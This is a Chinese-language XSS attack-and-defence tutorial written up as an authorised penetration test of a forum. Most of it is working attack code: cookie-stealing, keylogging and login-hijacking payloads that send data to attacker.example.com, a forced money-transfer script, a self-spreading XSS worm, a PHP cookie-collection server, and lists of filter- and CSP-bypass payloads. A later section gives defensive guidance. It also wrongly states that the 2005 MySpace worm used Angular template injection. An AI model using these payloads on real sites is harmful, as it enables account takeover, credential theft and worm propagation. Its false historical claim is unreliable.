# XSS跨站脚本攻防实战

## 一、案例背景

### 1.1 目标系统概述

**目标系统**：某在线论坛社区系统
- **系统地址**：http://forum.example.com
- **系统类型**：Java Spring Boot + Vue.js架构
- **测试范围**：授权渗透测试
- **测试时间**：2024年X月X日

### 1.2 测试目标

1. 发现XSS漏洞并分类
2. 验证漏洞可利用性
3. 测试各种绕过技巧
4. 评估实际危害
5. 提供修复方案

### 1.3 测试工具

| 工具名称 | 用途 |
|---------|------|
| Burp Suite | 抓包分析、Payload测试 |
| XSStrike | 自动化XSS检测 |
| Browser DevTools | 调试分析 |
| XSS Hunter | 盲XSS检测 |

---

## 二、反射型XSS发现与利用

### 2.1 漏洞发现

#### 2.1.1 搜索功能测试

在搜索框输入测试Payload：

**原始请求**：
```
GET /search?keyword=test HTTP/1.1
Host: forum.example.com
```

**测试Payload**：
```
GET /search?keyword=<script>alert(1)</script> HTTP/1.1
```

**响应内容**：
```html
<div class="search-result">
    <p>您搜索的关键词: <script>alert(1)</script></p>
    <p>共找到 0 条结果</p>
</div>
```

**结论**：存在反射型XSS，输入未经过滤直接输出到页面。

### 2.2 漏洞验证

#### 2.2.1 构造PoC

```html
<script>alert(document.domain)</script>
```

弹出对话框显示域名，确认漏洞存在。

#### 2.2.2 Cookie窃取Payload

```html
<script>
var img = new Image();
img.src = "http://attacker.example.com/steal?cookie=" + encodeURIComponent(document.cookie);
</script>
```

**简化版**：
```html
<script>new Image().src="http://attacker.example.com/steal?c="+document.cookie</script>
```

#### 2.2.3 构造钓鱼链接

```
http://forum.example.com/search?keyword=<script>new Image().src="http://attacker.example.com/steal?c="+document.cookie</script>
```

对链接进行URL编码后发送给受害者：
```
http://forum.example.com/search?keyword=%3Cscript%3Enew%20Image%28%29.src%3D%22http%3A%2F%2Fattacker.example.com%2Fsteal%3Fc%3D%22%2Bdocument.cookie%3C%2Fscript%3E
```

### 2.3 键盘记录攻击

```html
<script>
var keys = '';
document.onkeypress = function(e) {
    keys += String.fromCharCode(e.charCode);
    if (keys.length > 10) {
        new Image().src = 'http://attacker.example.com/log?key=' + encodeURIComponent(keys);
        keys = '';
    }
};
</script>
```

### 2.4 页面篡改攻击

```html
<script>
document.body.innerHTML = '<h1>系统维护中</h1><p>请访问 http://fake.example.com 进行登录</p>';
</script>
```

---

## 三、存储型XSS发现与利用

### 3.1 漏洞发现

#### 3.1.1 帖子内容测试

在发帖功能中插入测试Payload：

**测试Payload**：
```html
<img src=x onerror=alert(1)>
```

**响应**：帖子发布成功，访问帖子页面时触发XSS。

#### 3.1.2 用户资料测试

在个人简介中插入：
```html
""><script>alert(1)</script>
```

**原始HTML**：
```html
<input type="text" value="""><script>alert(1)</script>">
```

成功跳出input标签，执行脚本。

### 3.2 存储型XSS危害演示

#### 3.2.1 窃取所有访问者Cookie

```html
<script>
if (!document.cookie.includes('xss_triggered')) {
    document.cookie = 'xss_triggered=1';
    new Image().src = 'http://attacker.example.com/collect?cookie=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(location.href);
}
</script>
```

#### 3.2.2 篡改页面内容

```html
<script>
// 替换登录表单
var loginForm = document.querySelector('form[action="/login"]');
if (loginForm) {
    loginForm.action = 'http://attacker.example.com/phishing';
    loginForm.onsubmit = function() {
        var username = this.querySelector('input[name="username"]').value;
        var password = this.querySelector('input[name="password"]').value;
        new Image().src = 'http://attacker.example.com/steal?u=' + username + '&p=' + password;
    };
}
</script>
```

#### 3.2.3 强制转账（针对金融系统）

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', '/api/transfer', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.setRequestHeader('X-CSRF-Token', document.querySelector('meta[name="csrf-token"]').content);
xhr.send(JSON.stringify({
    to: 'attacker_account',
    amount: 10000
}));
</script>
```

### 3.3 盲XSS测试

在管理员可见区域注入XSS：

```html
<script>
new Image().src = 'http://attacker.example.com/blind?cookie=' + encodeURIComponent(document.cookie) + '&user=' + encodeURIComponent(document.querySelector('.username').innerText);
</script>
```

当管理员查看时触发，获取管理员Cookie。

---

## 四、XSS绕过技巧

### 4.1 过滤绕过

#### 4.1.1 script标签被过滤

**原始过滤**：删除`<script>`标签

**绕过方法**：

1. **使用事件处理器**：
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
```

2. **使用伪协议**：
```html
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
```

#### 4.1.2 关键字过滤

**原始过滤**：过滤`alert`关键字

**绕过方法**：

1. **使用其他函数**：
```html
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>eval('al'+'ert(1)')</script>
<script>window['al'+'ert'](1)</script>
```

2. **使用编码**：
```html
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### 4.1.3 括号过滤

**原始过滤**：过滤`(`和`)`

**绕过方法**：
```html
<script>alert`1`</script>
<svg onload=alert`1`>
<img src=x onerror=alert`1`>
```

### 4.2 编码绕过

#### 4.2.1 HTML实体编码

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

#### 4.2.2 URL编码

```
%3Cscript%3Ealert(1)%3C/script%3E
```

#### 4.2.3 Unicode编码

```html
<script>\u0061lert(1)</script>
<script>eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')</script>
```

#### 4.2.4 Base64编码

```html
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### 4.3 大小写混合绕过

```html
<ScRiPt>alert(1)</sCrIpT>
<ImG sRc=x OnErRoR=alert(1)>
<SVG oNlOaD=alert(1)>
```

### 4.4 空白符绕过

```html
<script >alert(1)</script>
<script	>alert(1)</script>
<script
>alert(1)</script>
<img src=x onerror	=alert(1)>
```

### 4.5 注释混淆

```html
<script>/*<!--*/alert(1)/*-->*/</script>
<script><!--alert(1)--></script>
<img src=x onerror="/*'*/alert(1)/*'*/">
```

### 4.6 双写绕过

**原始过滤**：删除关键字

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onoerrornerror=alert(1)>
```

### 4.7 闭合绕过

**场景**：输入被放入属性值中

```html
原始: <input value="$input">
Payload: " onfocus=alert(1) autofocus x="
结果: <input value="" onfocus=alert(1) autofocus x="">
```

**场景**：输入被放入JS字符串中

```javascript
原始: var name = '$input';
Payload: '-alert(1)-'
结果: var name = ''-alert(1)-'';
```

---

## 五、Cookie窃取与利用

### 5.1 搭建接收平台

**attacker.example.com/steal.php**：
```php
<?php
$cookie = $_GET['cookie'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
file_put_contents('stolen_cookies.txt', "[$time] IP: $ip Cookie: $cookie\n", FILE_APPEND);
echo 'ok';
?>
```

### 5.2 完整窃取Payload

```html
<script>
(function(){
    var data = {
        cookie: document.cookie,
        url: location.href,
        userAgent: navigator.userAgent,
        referrer: document.referrer
    };
    new Image().src = 'http://attacker.example.com/steal?data=' + encodeURIComponent(JSON.stringify(data));
})();
</script>
```

### 5.3 Cookie利用

获取Cookie后，使用浏览器插件或脚本设置Cookie：

**使用EditThisCookie插件**：
1. 导入窃取的Cookie JSON
2. 刷新页面即可以受害者身份登录

**使用curl命令**：
```bash
curl -H "Cookie: session=stolen_session_value" http://forum.example.com/profile
```

---

## 六、XSS蠕虫传播

### 6.1 蠕虫原理

存储型XSS可以自我复制传播，形成XSS蠕虫。

### 6.2 蠕虫Payload示例

```javascript
<script>
(function(){
    // 检查是否已感染
    if (document.cookie.indexOf('xss_worm=1') > -1) return;
    
    // 标记已感染
    document.cookie = 'xss_worm=1; path=/';
    
    // 获取当前用户信息
    var currentUser = document.querySelector('.user-id').innerText;
    
    // 构造蠕虫代码（自身）
    var wormCode = '<script>' + arguments.callee.toString() + '();<' + '/script>';
    
    // 发送请求发布新帖子
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/api/post/create', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('X-CSRF-Token', document.querySelector('meta[name="csrf"]').content);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            console.log('Worm spread: ' + xhr.responseText);
        }
    };
    xhr.send(JSON.stringify({
        title: '有趣的发现！',
        content: '快来看看这个：' + wormCode
    }));
    
    // 通知攻击者
    new Image().src = 'http://attacker.example.com/worm?user=' + currentUser;
})();
</script>
```

### 6.3 蠕虫影响

2005年MySpace XSS蠕虫事件：
- 在几小时内感染超过100万用户
- 在用户资料中添加"Samy is my hero"
- 利用Angular框架的模板注入

---

## 七、CSP绕过

### 7.1 CSP简介

内容安全策略(CSP)是防御XSS的重要机制：

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

### 7.2 CSP绕过技巧

#### 7.2.1 利用允许的CDN

如果CSP允许某些CDN，可以利用CDN上的库：

```html
<script src="https://allowed.cdn.com/angular.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

#### 7.2.2 JSONP端点利用

如果CSP允许某些域的script-src：

```html
<script src="https://allowed.example.com/api/jsonp?callback=alert(1)"></script>
```

#### 7.2.3 DOM XSS绕过CSP

即使有CSP，DOM XSS仍可能存在：

```javascript
// 存在DOM XSS的代码
location.hash.slice(1) // 用户可控
element.innerHTML = location.hash.slice(1); // 直接赋值
```

Payload:
```
http://example.com/#<img src=x onerror=alert(1)>
```

#### 7.2.4 利用unsafe-eval

如果CSP包含`unsafe-eval`：

```html
<script>eval('alert(1)')</script>
```

#### 7.2.5 利用unsafe-inline

如果CSP包含`unsafe-inline`，CSP基本失效：

```html
<script>alert(1)</script>
```

### 7.3 CSP配置示例

**严格CSP配置**：
```
Content-Security-Policy: 
    default-src 'none';
    script-src 'self';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
    connect-src 'self';
    font-src 'self';
    frame-ancestors 'none';
    form-action 'self';
    base-uri 'self';
```

---

## 八、防御方案

### 8.1 输出编码

#### 8.1.1 HTML实体编码

```javascript
function htmlEncode(str) {
    return str.replace(/[&<>"']/g, function(s) {
        const entityMap = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;'
        };
        return entityMap[s];
    });
}

// 使用
element.innerHTML = htmlEncode(userInput);
```

#### 8.1.2 JavaScript编码

```javascript
function jsEncode(str) {
    return str.replace(/[\\"']/g, function(s) {
        return '\\' + s.charCodeAt(0).toString(16);
    });
}

// 使用
var name = "<%= jsEncode(userInput) %>";
```

#### 8.1.3 URL编码

```javascript
// 使用内置函数
var safeUrl = encodeURIComponent(userInput);
```

### 8.2 使用安全API

#### 8.2.1 避免innerHTML

```javascript
// 危险
element.innerHTML = userInput;

// 安全
element.textContent = userInput;
element.innerText = userInput;

// 使用DOM API
const div = document.createElement('div');
div.textContent = userInput;
container.appendChild(div);
```

#### 8.2.2 使用框架的安全机制

**Vue.js**：
```html
<!-- 默认转义，安全 -->
<div>{{ userInput }}</div>

<!-- 危险，避免使用 -->
<div v-html="userInput"></div>
```

**React**：
```jsx
// 默认转义，安全
<div>{userInput}</div>

// 危险，避免使用
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

### 8.3 配置CSP

#### 8.3.1 HTTP响应头

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; object-src 'none'
```

#### 8.3.2 HTML meta标签

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

#### 8.3.3 使用nonce

```html
<script nonce="abc123">
// 只有带正确nonce的脚本才能执行
console.log('This is safe');
</script>
```

### 8.4 HttpOnly Cookie

设置Cookie的HttpOnly属性，防止JavaScript读取：

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 8.5 输入验证

```javascript
// 白名单验证
function sanitizeInput(input) {
    // 只允许字母、数字、空格
    return input.replace(/[^a-zA-Z0-9\s]/g, '');
}

// 长度限制
if (input.length > 100) {
    throw new Error('Input too long');
}
```

### 8.6 使用XSS过滤库

**DOMPurify**：
```javascript
import DOMPurify from 'dompurify';

// 清洗HTML
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;

// 允许特定标签
const clean = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
});
```

---

## 九、完整Payload记录

### 9.1 基硋试探Payload

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<a href="javascript:alert(1)">click</a>
```

### 9.2 事件处理器Payload

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

### 9.3 编码绕过Payload

```html
<!-- HTML实体编码 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Unicode编码 -->
<script>\u0061lert(1)</script>

<!-- Base64 -->
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
```

### 9.4 Cookie窃取Payload

```html
<script>new Image().src="http://attacker.example.com/steal?c="+document.cookie</script>
<script>fetch("http://attacker.example.com/steal?c="+document.cookie)</script>
<script>navigator.sendBeacon("http://attacker.example.com/steal",document.cookie)</script>
```

### 9.5 绕过过滤Payload

```html
<!-- 大小写混合 -->
<ScRiPt>alert(1)</sCrIpT>

<!-- 空白符 -->
<img src=x onerror	=alert(1)>

<!-- 双写 -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- 伪协议 -->
<a href="java&#x73;cript:alert(1)">click</a>
```

---

## 十、总结

### 10.1 XSS类型对比

| 类型 | 存储位置 | 触发方式 | 危害程度 |
|------|----------|----------|----------|
| 反射型 | URL参数 | 诱骗点击 | 中 |
| 存储型 | 数据库 | 自动触发 | 高 |
| DOM型 | 页面JS | 自动触发 | 中-高 |

### 10.2 防御优先级

1. **立即实施**：输出编码
2. **立即实施**：HttpOnly Cookie
3. **短期实施**：配置CSP
4. **中期实施**：输入验证
5. **长期实施**：安全开发培训

### 10.3 检测建议

1. 使用自动化工具扫描
2. 对所有输入点进行人工测试
3. 关注用户可控数据的输出位置
4. 定期进行渗透测试

---

> **免责声明**：本文档仅用于授权的安全测试和教育目的。未经授权对他人系统进行渗透测试属于违法行为，请遵守当地法律法规。
